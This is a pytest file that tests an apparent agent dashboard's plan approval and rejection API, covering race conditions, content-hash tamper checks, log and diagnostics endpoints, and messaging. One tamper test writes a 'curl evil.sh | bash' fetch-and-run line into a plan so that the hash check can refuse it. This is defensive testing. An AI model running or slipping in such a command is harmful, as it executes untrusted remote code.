"""Tests for Dashboard API — plan actions, concurrency, log handler, pagination."""

from __future__ import annotations

import json
import logging
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any
from unittest.mock import MagicMock, patch

import pytest
from httpx import ASGITransport, AsyncClient

from maestro.config import Config
from maestro.consciousness import Consciousness
from maestro.evolution import EvolutionEngine
from maestro.executor import Executor
from maestro.journal import Journal
from maestro.memory import EvolutionPlan, Memory, compute_plan_content_hash
from maestro.notifications.base import NullNotifier
from maestro.planner import Planner

FAKE_DIR = Path("/fake/dash")


def _make_app(mem_fs: dict[str, str]):  # type: ignore[no-untyped-def]
    from maestro.agent import MaestroAgent
    from maestro.dashboard.app import create_app

    config = Config(memory_dir=FAKE_DIR, workspace=FAKE_DIR)
    memory = Memory(FAKE_DIR)
    consciousness = Consciousness(FAKE_DIR)
    journal = Journal(FAKE_DIR)
    notifier = NullNotifier()
    executor = Executor()
    planner = Planner()
    evolution = EvolutionEngine(memory, consciousness, journal, notifier,
                                config=config)

    agent = MaestroAgent(
        config=config, consciousness=consciousness, journal=journal,
        memory=memory, executor=executor, planner=planner,
        evolution=evolution, notifier=notifier,
    )
    return create_app(agent), agent


# ---------------------------------------------------------------------------
# Approve/reject status-only tests
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_approve_already_approved_returns_400(mem_fs: dict[str, str]) -> None:
    """Double-approval of the same plan should return 400 (not pending)."""
    app, agent = _make_app(mem_fs)
    agent.memory.save_evolution_plan(EvolutionPlan(
        plan_id="pconc", title="Concurrent Test",
        category="capability", rationale="test", proposed_changes=[],
        files_affected=[], expected_impact="",
        created_at="2025-01-01T00:00:00Z",
        status="approved",
    ))

    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        r = await client.post(
            "/api/plans/pconc/approve", json={"content_hash": "x"},
        )
    assert r.status_code == 400


# ---------------------------------------------------------------------------
# Stale status / race condition
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_reject_plan_rechecks_status_after_await(mem_fs: dict[str, str]) -> None:
    """reject_plan must fail if plan status changed while awaiting request.json()."""
    app, agent = _make_app(mem_fs)
    agent.memory.save_evolution_plan(EvolutionPlan(
        plan_id="pstale", title="Stale Status Test",
        category="capability", rationale="test", proposed_changes=[],
        files_affected=[], expected_impact="",
        created_at="2025-01-01T00:00:00Z",
    ))

    async def fake_json() -> dict[str, str]:
        # Simulate concurrent approve running while reject awaits body parsing
        agent.memory.update_plan_status("pstale", "approved")
        return {"reason": "no longer valid", "content_hash": "x"}

    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        import starlette.requests
        original_json = starlette.requests.Request.json

        patched = False

        async def patched_json(self: starlette.requests.Request) -> object:
            nonlocal patched
            if not patched and "pstale" in str(self.url):
                patched = True
                return await fake_json()
            return await original_json(self)

        with patch.object(starlette.requests.Request, "json", patched_json):
            r = await client.post(
                "/api/plans/pstale/reject",
                json={"reason": "should not proceed", "content_hash": "x"},
            )

    assert r.status_code == 400, (
        f"Expected 400 but got {r.status_code}: reject_plan succeeded even though "
        "the plan status changed to 'approved' while awaiting request.json()"
    )


@pytest.mark.asyncio
async def test_reject_plan_rechecks_existence_after_await(mem_fs: dict[str, str]) -> None:
    """reject_plan must return 404 if the plan is deleted while awaiting request.json().

    The pre-body fast-path sees a pending plan, but a concurrent deletion during
    body parse makes reject_plan_action's authoritative get_plan return None,
    exercising the post-await PlanNotFoundError -> 404 branch. Together with
    test_reject_plan_rechecks_status_after_await this fences both directions of
    the guarantee the fast-path must not weaken.
    """
    app, agent = _make_app(mem_fs)
    agent.memory.save_evolution_plan(EvolutionPlan(
        plan_id="pvanish", title="Vanishing Plan",
        category="capability", rationale="test", proposed_changes=[],
        files_affected=[], expected_impact="",
        created_at="2025-01-01T00:00:00Z",
    ))

    real_get_plan = agent.memory.get_plan
    deleted = False

    def guarded_get_plan(plan_id: str) -> EvolutionPlan | None:
        # Simulate a plan that vanishes concurrently once the body parse begins.
        if deleted:
            return None
        return real_get_plan(plan_id)

    async def fake_json() -> dict[str, str]:
        nonlocal deleted
        deleted = True
        return {"reason": "no longer valid", "content_hash": "x"}

    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        import starlette.requests
        original_json = starlette.requests.Request.json

        patched = False

        async def patched_json(self: starlette.requests.Request) -> object:
            nonlocal patched
            if not patched and "pvanish" in str(self.url):
                patched = True
                return await fake_json()
            return await original_json(self)

        with patch.object(agent.memory, "get_plan", guarded_get_plan), \
                patch.object(starlette.requests.Request, "json", patched_json):
            r = await client.post(
                "/api/plans/pvanish/reject",
                json={"reason": "should not proceed", "content_hash": "x"},
            )

    assert r.status_code == 404, (
        f"Expected 404 but got {r.status_code}: reject_plan did not re-check "
        "plan existence after awaiting request.json()"
    )


# ---------------------------------------------------------------------------
# Extracted approve/reject action functions
# ---------------------------------------------------------------------------


def test_approve_plan_action_success(mem_fs: dict[str, str]) -> None:
    """approve_plan_action should update plan to approved and return status."""
    from maestro.dashboard.routes import approve_plan_action

    _, agent = _make_app(mem_fs)
    agent.memory.save_evolution_plan(EvolutionPlan(
        plan_id="pa_action", title="Action Approve",
        category="capability", rationale="test", proposed_changes=[],
        files_affected=[], expected_impact="",
        created_at="2025-01-01T00:00:00Z",
    ))

    saved = agent.memory.get_plan("pa_action")
    assert saved is not None
    result = approve_plan_action(agent, "pa_action", saved.plan_content_hash)

    assert result == "approved"
    plan = agent.memory.get_plan("pa_action")
    assert plan is not None
    assert plan.status == "approved"


def test_approve_plan_action_not_found(mem_fs: dict[str, str]) -> None:
    from maestro.dashboard.routes import PlanNotFoundError, approve_plan_action

    _, agent = _make_app(mem_fs)
    with pytest.raises(PlanNotFoundError):
        approve_plan_action(agent, "nonexistent", "x")


def test_approve_plan_action_not_pending(mem_fs: dict[str, str]) -> None:
    from maestro.dashboard.routes import PlanNotPendingError, approve_plan_action

    _, agent = _make_app(mem_fs)
    agent.memory.save_evolution_plan(EvolutionPlan(
        plan_id="pa_done", title="Already Done",
        category="capability", rationale="test", proposed_changes=[],
        files_affected=[], expected_impact="",
        status="approved",
        created_at="2025-01-01T00:00:00Z",
    ))
    with pytest.raises(PlanNotPendingError):
        approve_plan_action(agent, "pa_done", "x")


def test_reject_plan_action_success(mem_fs: dict[str, str]) -> None:
    """reject_plan_action should update plan to rejected with reason."""
    from maestro.dashboard.routes import reject_plan_action

    _, agent = _make_app(mem_fs)
    agent.memory.save_evolution_plan(EvolutionPlan(
        plan_id="pr_action", title="Action Reject",
        category="capability", rationale="test", proposed_changes=[],
        files_affected=[], expected_impact="",
        created_at="2025-01-01T00:00:00Z",
    ))

    saved = agent.memory.get_plan("pr_action")
    assert saved is not None
    result = reject_plan_action(
        agent, "pr_action", "Not needed", saved.plan_content_hash,
    )

    assert result == "rejected"
    plan = agent.memory.get_plan("pr_action")
    assert plan is not None
    assert plan.status == "rejected"
    assert plan.rejection_reason == "Not needed"


def test_reject_plan_action_not_found(mem_fs: dict[str, str]) -> None:
    from maestro.dashboard.routes import PlanNotFoundError, reject_plan_action

    _, agent = _make_app(mem_fs)
    with pytest.raises(PlanNotFoundError):
        reject_plan_action(agent, "nonexistent", "reason", "x")


def _vanishing_get_plan(agent: Any) -> Any:
    """Return a ``get_plan`` stub that answers once, then reports deletion.

    The first call is the action's read-time status check; the second is the
    post-``False`` re-read, by which point another process has deleted the
    row.
    """
    real_get = agent.memory.get_plan
    call_count = {"n": 0}

    def vanishing_get(plan_id: str) -> Any:
        call_count["n"] += 1
        if call_count["n"] == 1:
            return real_get(plan_id)
        return None

    return vanishing_get


def test_approve_plan_action_vanished_raises_not_found(mem_fs: dict[str, str]) -> None:
    """update_plan_status False + re-fetch None → PlanNotFoundError.

    TOCTOU: get_plan succeeds but update_plan_status returns False because
    the plan was deleted in a race, so the re-read finds nothing.
    """
    from maestro.dashboard.routes import PlanNotFoundError, approve_plan_action

    _, agent = _make_app(mem_fs)
    agent.memory.save_evolution_plan(EvolutionPlan(
        plan_id="pa_race", title="Race Condition Test",
        category="capability", rationale="test", proposed_changes=[],
        files_affected=[], expected_impact="",
        created_at="2025-01-01T00:00:00Z",
    ))

    saved = agent.memory.get_plan("pa_race")
    assert saved is not None
    with (
        patch.object(agent.memory, "update_plan_status", return_value=False),
        patch.object(
            agent.memory, "get_plan", side_effect=_vanishing_get_plan(agent),
        ),
        pytest.raises(PlanNotFoundError),
    ):
        approve_plan_action(agent, "pa_race", saved.plan_content_hash)


def test_reject_plan_action_vanished_raises_not_found(mem_fs: dict[str, str]) -> None:
    """update_plan_status False + re-fetch None → PlanNotFoundError.

    TOCTOU: get_plan succeeds but update_plan_status returns False because
    the plan was deleted in a race, so the re-read finds nothing.
    """
    from maestro.dashboard.routes import PlanNotFoundError, reject_plan_action

    _, agent = _make_app(mem_fs)
    agent.memory.save_evolution_plan(EvolutionPlan(
        plan_id="pr_race", title="Race Condition Reject Test",
        category="capability", rationale="test", proposed_changes=[],
        files_affected=[], expected_impact="",
        created_at="2025-01-01T00:00:00Z",
    ))

    saved = agent.memory.get_plan("pr_race")
    assert saved is not None
    with (
        patch.object(agent.memory, "update_plan_status", return_value=False),
        patch.object(
            agent.memory, "get_plan", side_effect=_vanishing_get_plan(agent),
        ),
        pytest.raises(PlanNotFoundError),
    ):
        reject_plan_action(agent, "pr_race", "reason", saved.plan_content_hash)


def test_approve_plan_action_loses_race_raises_not_pending(
    mem_fs: dict[str, str],
) -> None:
    """A rival surface rejects between the read-time check and the write.

    Both surfaces pass their own ``pending_review`` check; the lock-checked
    ``expect_status`` makes the loser bail with ``PlanNotPendingError``
    instead of silently flipping the human's rejection to ``approved``.
    """
    from maestro.dashboard.routes import PlanNotPendingError, approve_plan_action

    _, agent = _make_app(mem_fs)
    agent.memory.save_evolution_plan(EvolutionPlan(
        plan_id="pa_lost", title="Lost Race Approve",
        category="capability", rationale="test", proposed_changes=[],
        files_affected=[], expected_impact="",
        created_at="2025-01-01T00:00:00Z",
    ))
    saved = agent.memory.get_plan("pa_lost")
    assert saved is not None

    real_update = agent.memory.update_plan_status
    call_count = {"n": 0}

    def racy_update(*args: Any, **kwargs: Any) -> bool:
        call_count["n"] += 1
        if call_count["n"] == 1:
            # Telegram rejects first, while this handler is mid-flight.
            real_update(
                "pa_lost", "rejected",
                rejection_reason="Rejected via Telegram",
                reviewed_at="2026-04-25T00:00:00+00:00",
            )
        return real_update(*args, **kwargs)

    with (
        patch.object(agent.memory, "update_plan_status", side_effect=racy_update),
        pytest.raises(PlanNotPendingError),
    ):
        approve_plan_action(agent, "pa_lost", saved.plan_content_hash)

    # The race winner's rejection survives verbatim.
    plan = agent.memory.get_plan("pa_lost")
    assert plan is not None
    assert plan.status == "rejected"
    assert plan.rejection_reason == "Rejected via Telegram"


def test_reject_plan_action_loses_race_raises_not_pending(
    mem_fs: dict[str, str],
) -> None:
    """The mirror case: a rival approve lands first, so the reject bails.

    Without the under-lock recheck this write would flip an approved plan to
    ``rejected``, poisoning rejection learning with feedback about a plan the
    human approved.
    """
    from maestro.dashboard.routes import PlanNotPendingError, reject_plan_action

    _, agent = _make_app(mem_fs)
    agent.memory.save_evolution_plan(EvolutionPlan(
        plan_id="pr_lost", title="Lost Race Reject",
        category="capability", rationale="test", proposed_changes=[],
        files_affected=[], expected_impact="",
        created_at="2025-01-01T00:00:00Z",
    ))
    saved = agent.memory.get_plan("pr_lost")
    assert saved is not None

    real_update = agent.memory.update_plan_status
    call_count = {"n": 0}

    def racy_update(*args: Any, **kwargs: Any) -> bool:
        call_count["n"] += 1
        if call_count["n"] == 1:
            # Telegram approves first, while this handler is mid-flight.
            real_update(
                "pr_lost", "approved",
                reviewed_at="2026-04-25T00:00:00+00:00",
            )
        return real_update(*args, **kwargs)

    with (
        patch.object(agent.memory, "update_plan_status", side_effect=racy_update),
        pytest.raises(PlanNotPendingError),
    ):
        reject_plan_action(agent, "pr_lost", "too late", saved.plan_content_hash)

    # The approval stands and no rejection reason leaked through.
    plan = agent.memory.get_plan("pr_lost")
    assert plan is not None
    assert plan.status == "approved"
    assert plan.rejection_reason is None


def test_approve_plan_action_refine_race_raises_content_mismatch(
    mem_fs: dict[str, str],
) -> None:
    """A concurrent refine_plan rewrites the body after the pre-lock check.

    ``refine_plan`` deliberately leaves the plan ``pending_review``, so
    ``expect_status`` alone still passes and the approval would land on
    content the human never saw. ``expect_content_hash`` makes the writer
    refuse, and the caller maps that loss to a 409-shaped mismatch.
    """
    from maestro.dashboard.routes import (
        PlanContentHashMismatchError,
        approve_plan_action,
    )

    _, agent = _make_app(mem_fs)
    agent.memory.save_evolution_plan(EvolutionPlan(
        plan_id="pa_refine", title="Refine Race Approve",
        category="capability", rationale="test", proposed_changes=["Change A"],
        files_affected=[], expected_impact="",
        created_at="2025-01-01T00:00:00Z",
    ))
    saved = agent.memory.get_plan("pa_refine")
    assert saved is not None
    snapshot = compute_plan_content_hash(saved)

    real_update = agent.memory.update_plan_status
    call_count = {"n": 0}

    def racy_update(*args: Any, **kwargs: Any) -> bool:
        call_count["n"] += 1
        if call_count["n"] == 1:
            # The curator refines the plan mid-flight, keeping it pending.
            agent.memory.refine_plan("pa_refine", proposed_changes=["Change B"])
        return real_update(*args, **kwargs)

    with (
        patch.object(agent.memory, "update_plan_status", side_effect=racy_update),
        pytest.raises(PlanContentHashMismatchError),
    ):
        approve_plan_action(agent, "pa_refine", snapshot)

    plan = agent.memory.get_plan("pa_refine")
    assert plan is not None
    assert plan.status == "pending_review"
    assert plan.reviewed_at is None
    assert plan.proposed_changes == ["Change B"]


@pytest.mark.asyncio
async def test_approve_plan_refine_race_returns_409(mem_fs: dict[str, str]) -> None:
    """The route maps the under-lock content loss to HTTP 409."""
    app, agent = _make_app(mem_fs)
    agent.memory.save_evolution_plan(EvolutionPlan(
        plan_id="pa_refine409", title="Refine Race 409",
        category="capability", rationale="test", proposed_changes=["Change A"],
        files_affected=[], expected_impact="",
        created_at="2025-01-01T00:00:00Z",
    ))
    saved = agent.memory.get_plan("pa_refine409")
    assert saved is not None
    snapshot = compute_plan_content_hash(saved)

    real_update = agent.memory.update_plan_status
    call_count = {"n": 0}

    def racy_update(*args: Any, **kwargs: Any) -> bool:
        call_count["n"] += 1
        if call_count["n"] == 1:
            agent.memory.refine_plan("pa_refine409", proposed_changes=["Change B"])
        return real_update(*args, **kwargs)

    with patch.object(
        agent.memory, "update_plan_status", side_effect=racy_update,
    ):
        async with AsyncClient(
            transport=ASGITransport(app=app), base_url="http://test",
        ) as client:
            resp = await client.post(
                "/api/plans/pa_refine409/approve",
                json={"content_hash": snapshot},
            )
    assert resp.status_code == 409

    plan = agent.memory.get_plan("pa_refine409")
    assert plan is not None
    assert plan.status == "pending_review"


def test_reject_plan_action_refine_race_raises_content_mismatch(
    mem_fs: dict[str, str],
) -> None:
    """The mirror case: a refinement lands before the rejection's write.

    Without the content precondition the rejection reason would be
    recorded against a body the reviewer never read, poisoning rejection
    learning.
    """
    from maestro.dashboard.routes import (
        PlanContentHashMismatchError,
        reject_plan_action,
    )

    _, agent = _make_app(mem_fs)
    agent.memory.save_evolution_plan(EvolutionPlan(
        plan_id="pr_refine", title="Refine Race Reject",
        category="capability", rationale="test", proposed_changes=["Change A"],
        files_affected=[], expected_impact="",
        created_at="2025-01-01T00:00:00Z",
    ))
    saved = agent.memory.get_plan("pr_refine")
    assert saved is not None
    snapshot = compute_plan_content_hash(saved)

    real_update = agent.memory.update_plan_status
    call_count = {"n": 0}

    def racy_update(*args: Any, **kwargs: Any) -> bool:
        call_count["n"] += 1
        if call_count["n"] == 1:
            agent.memory.refine_plan("pr_refine", proposed_changes=["Change B"])
        return real_update(*args, **kwargs)

    with (
        patch.object(agent.memory, "update_plan_status", side_effect=racy_update),
        pytest.raises(PlanContentHashMismatchError),
    ):
        reject_plan_action(agent, "pr_refine", "stale feedback", snapshot)

    plan = agent.memory.get_plan("pr_refine")
    assert plan is not None
    assert plan.status == "pending_review"
    assert plan.rejection_reason is None
    assert plan.reviewed_at is None


def test_approve_plan_action_hash_mismatch(mem_fs: dict[str, str]) -> None:
    """A stale hash raises PlanContentHashMismatchError before any mutation."""
    from maestro.dashboard.routes import (
        PlanContentHashMismatchError,
        approve_plan_action,
    )

    _, agent = _make_app(mem_fs)
    agent.memory.save_evolution_plan(EvolutionPlan(
        plan_id="pa_hash", title="Hash Mismatch",
        category="capability", rationale="test", proposed_changes=[],
        files_affected=[], expected_impact="",
        created_at="2025-01-01T00:00:00Z",
    ))

    with pytest.raises(PlanContentHashMismatchError):
        approve_plan_action(agent, "pa_hash", "0" * 64)

    plan = agent.memory.get_plan("pa_hash")
    assert plan is not None
    assert plan.status == "pending_review"


def test_reject_plan_action_hash_mismatch(mem_fs: dict[str, str]) -> None:
    """A stale hash raises PlanContentHashMismatchError before any mutation."""
    from maestro.dashboard.routes import (
        PlanContentHashMismatchError,
        reject_plan_action,
    )

    _, agent = _make_app(mem_fs)
    agent.memory.save_evolution_plan(EvolutionPlan(
        plan_id="pr_hash", title="Hash Mismatch Reject",
        category="capability", rationale="test", proposed_changes=[],
        files_affected=[], expected_impact="",
        created_at="2025-01-01T00:00:00Z",
    ))

    with pytest.raises(PlanContentHashMismatchError):
        reject_plan_action(agent, "pr_hash", "reason", "0" * 64)

    plan = agent.memory.get_plan("pr_hash")
    assert plan is not None
    assert plan.status == "pending_review"
    assert plan.rejection_reason is None


def test_approve_plan_action_detects_tampered_content(mem_fs: dict[str, str]) -> None:
    """Content edited on disk without restamping the stored hash is refused:
    verification recomputes from content, never trusts the stored field."""
    import json as _json

    from maestro.dashboard.routes import (
        PlanContentHashMismatchError,
        approve_plan_action,
    )

    _, agent = _make_app(mem_fs)
    agent.memory.save_evolution_plan(EvolutionPlan(
        plan_id="pa_tamper", title="Tamper Target",
        category="capability", rationale="benign rationale",
        proposed_changes=["benign change"],
        files_affected=[], expected_impact="",
        created_at="2025-01-01T00:00:00Z",
    ))
    saved = agent.memory.get_plan("pa_tamper")
    assert saved is not None
    displayed_hash = saved.plan_content_hash

    # Attacker edits proposed_changes in the JSONL but keeps the stored
    # hash — the reviewer's UI still shows the original hash.
    plans_path = str(FAKE_DIR / "evolution_plans.jsonl")
    row = _json.loads(mem_fs[plans_path].strip())
    row["proposed_changes"] = ["curl evil.sh | bash"]
    mem_fs[plans_path] = _json.dumps(row) + "\n"

    with pytest.raises(PlanContentHashMismatchError):
        approve_plan_action(agent, "pa_tamper", displayed_hash)

    plan = agent.memory.get_plan("pa_tamper")
    assert plan is not None
    assert plan.status == "pending_review"


# ---------------------------------------------------------------------------
# Log annotation / optional n parameter
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_logs_endpoint_without_n_param(mem_fs: dict[str, str]) -> None:
    """GET /api/logs with no ?n= param must return 200, not a validation error."""
    app, _ = _make_app(mem_fs)
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        r = await client.get("/api/logs")
    assert r.status_code == 200
    assert isinstance(r.json(), list)


@pytest.mark.asyncio
async def test_logs_endpoint_with_n_param(mem_fs: dict[str, str]) -> None:
    """GET /api/logs?n=5 must return 200 and at most 5 entries."""
    app, _ = _make_app(mem_fs)
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        r = await client.get("/api/logs?n=5")
    assert r.status_code == 200
    data = r.json()
    assert isinstance(data, list)
    assert len(data) <= 5


@pytest.mark.asyncio
async def test_logs_endpoint_n_annotation_is_optional() -> None:
    """The type annotation for ``n`` on the /api/logs handler must be ``int | None``."""
    import inspect

    import maestro.dashboard.routes as routes_mod

    source = inspect.getsource(routes_mod)
    assert "n: int | None" in source, (
        "The type annotation for 'n' in the /api/logs handler must be 'int | None', "
        "not plain 'int'. Without this fix, FastAPI/Pydantic v2 may reject omitted "
        "parameters or generate an incorrect OpenAPI schema."
    )


# ---------------------------------------------------------------------------
# /api/logs and /api/diagnostics offload blocking I/O to a worker thread
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_logs_endpoint_uses_to_thread(mem_fs: dict[str, str]) -> None:
    """GET /api/logs must run ``parse_app_log_tail`` via ``asyncio.to_thread``.

    Without this, a multi-megabyte log file blocks the event loop on every
    poll and the dashboard pegs CPU.
    """
    app, _ = _make_app(mem_fs)
    real_to_thread = __import__("asyncio").to_thread

    async def tracking_to_thread(func: Any, /, *args: Any, **kwargs: Any) -> Any:
        tracking_to_thread.calls.append(getattr(func, "__name__", repr(func)))  # type: ignore[attr-defined]
        return await real_to_thread(func, *args, **kwargs)
    tracking_to_thread.calls = []  # type: ignore[attr-defined]

    with patch("maestro.dashboard.routes.asyncio.to_thread", tracking_to_thread):
        async with AsyncClient(
            transport=ASGITransport(app=app), base_url="http://test",
        ) as client:
            r = await client.get("/api/logs?n=5")

    assert r.status_code == 200
    assert "parse_app_log_tail" in tracking_to_thread.calls  # type: ignore[attr-defined]


@pytest.mark.asyncio
async def test_diagnostics_endpoint_uses_to_thread(mem_fs: dict[str, str]) -> None:
    """GET /api/diagnostics must offload ``build_diagnostic_snapshot``."""
    app, _ = _make_app(mem_fs)
    real_to_thread = __import__("asyncio").to_thread

    async def tracking_to_thread(func: Any, /, *args: Any, **kwargs: Any) -> Any:
        tracking_to_thread.calls.append(getattr(func, "__name__", repr(func)))  # type: ignore[attr-defined]
        return await real_to_thread(func, *args, **kwargs)
    tracking_to_thread.calls = []  # type: ignore[attr-defined]

    with patch("maestro.dashboard.routes.asyncio.to_thread", tracking_to_thread):
        async with AsyncClient(
            transport=ASGITransport(app=app), base_url="http://test",
        ) as client:
            r = await client.get("/api/diagnostics")

    assert r.status_code == 200
    assert "build_diagnostic_snapshot" in tracking_to_thread.calls  # type: ignore[attr-defined]


@pytest.mark.asyncio
async def test_status_endpoint_uses_to_thread(mem_fs: dict[str, str]) -> None:
    """GET /api/status must offload the shared-disk ``read_loop_runtime``."""
    app, _ = _make_app(mem_fs)
    real_to_thread = __import__("asyncio").to_thread

    async def tracking_to_thread(func: Any, /, *args: Any, **kwargs: Any) -> Any:
        tracking_to_thread.calls.append(getattr(func, "__name__", repr(func)))  # type: ignore[attr-defined]
        return await real_to_thread(func, *args, **kwargs)
    tracking_to_thread.calls = []  # type: ignore[attr-defined]

    with patch("maestro.dashboard.routes.asyncio.to_thread", tracking_to_thread):
        async with AsyncClient(
            transport=ASGITransport(app=app), base_url="http://test",
        ) as client:
            r = await client.get("/api/status")

    assert r.status_code == 200
    assert "read_loop_runtime" in tracking_to_thread.calls  # type: ignore[attr-defined]


@pytest.mark.asyncio
async def test_diagnostics_endpoint_returns_fallback_on_error(
    mem_fs: dict[str, str],
) -> None:
    """GET /api/diagnostics degrades to a 200 fallback when snapshot build raises.

    Diagnostics is best-effort observability polled on every dashboard refresh;
    an unexpected raise while reading operational state (permission error on the
    app-log path, a corrupt log line, an agent accessor raising) must not 500 the
    panel. The handler mirrors ``contemplate()``'s blessed pattern: log the
    failure loud (``warning`` + ``exc_info``) and return a safe fallback body that
    carries the full response schema so the dashboard JS keeps a stable shape.
    """
    app, _ = _make_app(mem_fs)

    def _raise(*_args: Any, **_kwargs: Any) -> Any:
        raise RuntimeError("corrupt log")

    with patch("maestro.diagnostics.build_diagnostic_snapshot", _raise):
        async with AsyncClient(
            transport=ASGITransport(app=app), base_url="http://test",
        ) as client:
            r = await client.get("/api/diagnostics")

    assert r.status_code == 200
    body = r.json()
    # Fallback carries every key the success path returns, with safe defaults.
    assert body["recent_error_count"] == 0
    assert body["has_quota_warning"] is False
    assert body["has_rate_limit"] is False
    assert body["consecutive_failures"] == 0
    assert body["summary"] == "Diagnostics temporarily unavailable"
    assert body["sdk_usage"] is None
    assert body["burn_rate_usd_per_hour"] is None
    assert body["max_loop_budget_usd_per_hour"] is None
    assert body["budget_throttle_active"] is False
    assert body["budget_throttle_entered_at"] is None
    assert body["peak_throttle_active"] is False
    assert body["maintenance_mode_active"] is False


@pytest.mark.asyncio
async def test_diagnostics_success_and_fallback_share_keys(
    mem_fs: dict[str, str],
) -> None:
    """Success and fallback diagnostics responses must carry identical keys.

    Both bodies are polled by the same dashboard JS, which depends on a stable
    shape. If a field is added to one path but not the other the panel silently
    renders wrong on whichever body is missing it — the exact drift the #454
    fix's shared ``_DIAGNOSTICS_FALLBACK`` source exists to prevent. Seeding both
    paths from that constant makes one drift direction impossible; this guards
    the other (a key overwritten only in the success path).
    """
    from maestro.dashboard.routes import (
        _DIAGNOSTICS_FALLBACK,
        _diagnostics_response,
    )
    from maestro.diagnostics import DiagnosticSnapshot

    _, agent = _make_app(mem_fs)

    snapshot = DiagnosticSnapshot(
        recent_error_count=3,
        has_quota_warning=True,
        has_rate_limit=True,
        consecutive_failures=2,
        summary="live",
        sdk_usage=None,
    )
    with patch(
        "maestro.diagnostics.build_diagnostic_snapshot",
        lambda *_a, **_k: snapshot,
    ):
        success = await _diagnostics_response(agent)

    def _raise(*_args: Any, **_kwargs: Any) -> Any:
        raise RuntimeError("boom")

    with patch("maestro.diagnostics.build_diagnostic_snapshot", _raise):
        fallback = await _diagnostics_response(agent)

    assert set(success.keys()) == set(fallback.keys())
    assert set(success.keys()) == set(_DIAGNOSTICS_FALLBACK.keys())


# ---------------------------------------------------------------------------
# create_router logging side-effect tests
# ---------------------------------------------------------------------------


def test_create_router_attaches_no_inmemory_log_handler() -> None:
    """create_router must not attach any in-memory log handler to the maestro logger.

    The dashboard serves ``/api/logs`` from the app-log file via
    ``parse_app_log_tail``; the old ``DashboardLogHandler`` ring buffer was dead
    work on the hot logging path (nothing read ``.records``). This guards against
    a handler being re-introduced.
    """
    from maestro.dashboard.routes import create_router

    agent = MagicMock()
    agent.config.rejection_reason_max = 2000
    agent.config.max_page_size = 500
    agent.config.log_buffer_size = 500
    agent.config.sdk_log_dir = Path("/fake/sdk")
    agent.config.session_data_days = 10
    agent.config.app_log_path = Path("/fake/app.log")

    maestro_logger = logging.getLogger("maestro")
    handlers_before = list(maestro_logger.handlers)
    create_router(agent)
    handlers_after = list(maestro_logger.handlers)
    assert handlers_after == handlers_before, (
        "create_router must not attach any handler to the maestro logger"
    )


# ---------------------------------------------------------------------------
# Messaging endpoint tests
# ---------------------------------------------------------------------------


def _make_app_with_messages(mem_fs: dict[str, str]):  # type: ignore[no-untyped-def]
    from maestro.agent import MaestroAgent
    from maestro.dashboard.app import create_app
    from maestro.messaging import MessageStore

    config = Config(memory_dir=FAKE_DIR, workspace=FAKE_DIR)
    memory = Memory(FAKE_DIR)
    consciousness = Consciousness(FAKE_DIR)
    journal = Journal(FAKE_DIR)
    notifier = NullNotifier()
    executor = Executor()
    planner = Planner()
    evolution = EvolutionEngine(memory, consciousness, journal, notifier,
                                config=config)
    message_store = MessageStore(FAKE_DIR)

    agent = MaestroAgent(
        config=config, consciousness=consciousness, journal=journal,
        memory=memory, executor=executor, planner=planner,
        evolution=evolution, notifier=notifier, message_store=message_store,
    )
    return create_app(agent), agent


@pytest.mark.asyncio
async def test_get_messages_empty(mem_fs: dict[str, str]) -> None:
    app, _ = _make_app_with_messages(mem_fs)
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as c:
        r = await c.get("/api/messages")
    assert r.status_code == 200
    assert r.json() == []


@pytest.mark.asyncio
async def test_get_messages_no_store(mem_fs: dict[str, str]) -> None:
    """When message_store is None, GET /api/messages returns empty list."""
    app, _ = _make_app(mem_fs)
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as c:
        r = await c.get("/api/messages")
    assert r.status_code == 200
    assert r.json() == []


@pytest.mark.asyncio
async def test_post_message(mem_fs: dict[str, str]) -> None:
    app, agent = _make_app_with_messages(mem_fs)
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as c:
        r = await c.post("/api/messages", json={
            "content": "Focus on documentation",
            "message_type": "instruction",
        })
    assert r.status_code == 200
    data = r.json()
    assert data["status"] == "sent"
    assert "message_id" in data

    # Verify message is persisted
    assert agent.message_store is not None
    msgs = agent.message_store.get_recent(10)
    assert len(msgs) == 1
    assert msgs[0].content == "Focus on documentation"
    assert msgs[0].sender == "thomas"
    assert msgs[0].message_type == "instruction"


@pytest.mark.asyncio
async def test_post_message_empty_content(mem_fs: dict[str, str]) -> None:
    app, _ = _make_app_with_messages(mem_fs)
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as c:
        r = await c.post("/api/messages", json={"content": ""})
    assert r.status_code == 400
    assert "content" in r.json()["error"]


@pytest.mark.asyncio
@pytest.mark.parametrize("message_type", ["invalid", "plan_feedback"])
async def test_post_message_invalid_type(
    mem_fs: dict[str, str], message_type: str,
) -> None:
    """``plan_feedback`` is a stored type the generic route must not write."""
    app, _ = _make_app_with_messages(mem_fs)
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as c:
        r = await c.post("/api/messages", json={
            "content": "hello", "message_type": message_type,
        })
    assert r.status_code == 400
    assert "message_type" in r.json()["error"]


@pytest.mark.asyncio
async def test_post_message_invalid_json(mem_fs: dict[str, str]) -> None:
    app, _ = _make_app_with_messages(mem_fs)
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as c:
        r = await c.post("/api/messages", content=b"not json", headers={"content-type": "application/json"})
    assert r.status_code == 400


@pytest.mark.asyncio
async def test_post_message_no_store(mem_fs: dict[str, str]) -> None:
    """When message_store is None, POST /api/messages returns 501."""
    app, _ = _make_app(mem_fs)
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as c:
        r = await c.post("/api/messages", json={"content": "hello"})
    assert r.status_code == 501


@pytest.mark.asyncio
async def test_post_message_with_reply_to(mem_fs: dict[str, str]) -> None:
    app, agent = _make_app_with_messages(mem_fs)
